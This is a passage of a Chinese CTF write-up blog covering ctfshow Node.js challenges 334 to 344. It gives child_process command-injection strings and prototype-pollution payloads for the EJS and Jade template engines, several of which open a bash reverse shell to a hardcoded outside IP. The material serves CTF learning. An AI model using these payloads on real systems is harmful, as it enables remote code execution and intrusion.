class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>简单来说，调用系统命令传入的方法是</p><p>在JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历object2的时候会存在这个键。</p><p><strong>334</strong></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> <span class="token function-variable function">findUser</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> users<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> name<span class="token operator">!==</span><span class="token string">'CTFSHOW'</span> <span class="token operator">&amp;&amp;</span> item<span class="token punctuation">.</span>username <span class="token operator">===</span> name<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> item<span class="token punctuation">.</span>password <span class="token operator">===</span> password<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接小写就行<code>ctfshow+123456</code></p><p><strong>335</strong></p><p>看源代码发现eval参数，尝试传入ls回显未找到文件，传入1+1回显2，怀疑执行了nodejs中的eval函数</p><blockquote><p>在nodejs中，eval()方法用于计算字符串，并把它作为脚本代码来执行，语法为“eval(string)”；如果参数不是字符串，而是整数或者是Function类型，则直接返回该整数或Function。</p></blockquote><p>构造一个系统命令执行的payload</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到文件名直接cat就行</p><p><strong>336</strong></p><p>同上题不过增加了过滤</p><p>换一个方法</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">spawnSync</span><span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>stdout<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>337</strong></p><p>源码在此</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> crypto<span class="token punctuation">.</span><span class="token function">createHash</span><span class="token punctuation">(</span><span class="token string">'md5'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* GET home page. */</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'xxxxxxx'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> a <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>a<span class="token punctuation">;</span>  <span class="token keyword">var</span> b <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>b<span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">&amp;&amp;</span> b <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">.</span>length<span class="token operator">===</span>b<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> a<span class="token operator">!==</span>b <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span>a<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span>b<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'tql'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>要求就是传入的ab长度相等，内容不想等，加上flag字符串变量后md5运算的结果相同</p><blockquote><p>在javascript中加法的规则很简单，只能数字与数字相加或字符串和字符串相加；所有其他类型的值都会自动转换成这两个类型的值。而对象类型经过toString转换后结果为[object Object]字符串</p></blockquote><p>所以最终传入两个数组即可</p><pre class="line-numbers language-none"><code class="language-none">payload:?a[x]&#x3D;1&amp;b[x]&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>为啥数组的键值不能是数字</p><pre class="line-numbers language-none"><code class="language-none">a&#x3D;&#123;&#39;x&#39;:&#39;1&#39;&#125;b&#x3D;&#123;&#39;x&#39;:&#39;2&#39;&#125;console.log(a+&quot;flag&#123;xxx&#125;&quot;)console.log(b+&quot;flag&#123;xxx&#125;&quot;)二者得出的结果都是[object Object]flag&#123;xxx&#125;，所以md5值也相同但是如果传a[0]&#x3D;1&amp;b[0]&#x3D;2，相当于创了个变量a&#x3D;[1] b&#x3D;[2]，再像上面那样打印的时候，会打印出1flag&#123;xxx&#125;和2flag&#123;xxx&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>338</strong></p><p>原型链污染</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//login.js</span><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> utils <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../utils/common'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* GET home page.  */</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'flag_here'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> secert <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> sess <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">;</span>  <span class="token keyword">let</span> user <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  utils<span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>secert<span class="token punctuation">.</span>ctfshow<span class="token operator">===</span><span class="token string">'36dboy'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'登录失败'</span><span class="token operator">+</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>utils.copy(user,req.body);</code>这个和merge差不多</p><pre class="line-numbers language-none"><code class="language-none">payload:POST&#123;&quot;__proto__&quot;:&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>339</strong></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//login.js</span><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> utils <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../utils/common'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>username<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>password<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">normalUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>user<span class="token punctuation">&#125;</span><span class="token comment">/* GET home page.  */</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'flag_here'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> secert <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> sess <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">;</span>  <span class="token keyword">let</span> user <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  utils<span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>secert<span class="token punctuation">.</span>ctfshow<span class="token operator">===</span>flag<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'登录失败'</span><span class="token operator">+</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这要让ctfshow=flag变量，我不行捏，看看旁边的app.js</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//api.js</span><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> utils <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../utils/common'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* GET home page.  */</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'api'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">query</span><span class="token operator">:</span> <span class="token function">Function</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>Function(“console.log(‘HelloWolrd’)”)()</li></ul><p>类似于php中的create_function</p><p>对于ejs渲染引擎来说，对opts有原型链污染漏洞</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>opts<span class="token punctuation">.</span>outputFunctionName<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        prepended <span class="token operator">+=</span> <span class="token string">'  var '</span> <span class="token operator">+</span> opts<span class="token punctuation">.</span>outputFunctionName <span class="token operator">+</span> <span class="token string">' = __append;'</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这里我们就可以污染outputFunctionName来执行恶意代码</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token punctuation">&#123;</span><span class="token string-property property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token string-property property">"outputFunctionName"</span><span class="token operator">:</span><span class="token string">"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >&amp; /dev/tcp/45.15.131.101/2337 0>&amp;1\"');var __tmp2"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通过login污染再通过api渲染调用</p><p><strong>340</strong></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> utils <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../utils/common'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* GET home page.  */</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'flag_here'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>userinfo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>isVIP <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>isAdmin <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>isAuthor <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  utils<span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>userinfo<span class="token punctuation">,</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>userinfo<span class="token punctuation">.</span>isAdmin<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>   <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'登录失败'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里要向上污染两层才行，其他的都和上面一样</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"outputFunctionName"</span><span class="token operator">:</span><span class="token string">"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >&amp; /dev/tcp/45.15.131.101/2337 0>&amp;1\"');var __tmp2"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>341</strong></p><p>没有api了，直接ejs的rce</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"outputFunctionName"</span><span class="token operator">:</span><span class="token string">"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >&amp; /dev/tcp/45.15.131.101/2337 0>&amp;1\"');var __tmp2"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>342，343</strong></p><p>不是ejs渲染模版了</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202205282335944.png"></p><p>是jade渲染模版，找jade的原型链污染rce</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"__proto__"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"Block"</span><span class="token punctuation">,</span><span class="token property">"nodes"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token property">"compileDebug"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"self"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"line"</span><span class="token operator">:</span><span class="token string">"global.process.mainModule.require('child_process').exec('bash -c \"bash -i >&amp; /dev/tcp/45.15.131.101/2337 0>&amp;1\"')"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>344</strong></p><p>源码</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag <span class="token operator">=</span> <span class="token string">'flag_here'</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">8c|2c|\,</span><span class="token regex-delimiter">/</span><span class="token regex-flags">ig</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'where is flag :)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">var</span> query <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>query<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>query<span class="token punctuation">.</span>name<span class="token operator">===</span><span class="token string">'admin'</span><span class="token operator">&amp;&amp;</span>query<span class="token punctuation">.</span>password<span class="token operator">===</span><span class="token string">'ctfshow'</span><span class="token operator">&amp;&amp;</span>query<span class="token punctuation">.</span>isVIP<span class="token operator">===</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'where is flag. :)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据源码我们正常情况下需要传<code>?query=&#123;&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;ctfshow&quot;,&quot;isVIP&quot;:true&#125;</code>但是题目把逗号和他的url编码给过滤掉了，所以需要绕过。</p><pre class="line-numbers language-none"><code class="language-none">payload:?query&#x3D;&#123;&quot;name&quot;:&quot;admin&quot;&amp;query&#x3D;&quot;password&quot;:&quot;%63tfshow&quot;&amp;query&#x3D;&quot;isVIP&quot;:true&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>nodejs中会把这三部分拼接起来，为什么把ctfshow中的c编码呢，因为双引号的url编码是%22再和c连接起来就是%22c，会匹配到正则表达式。</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" 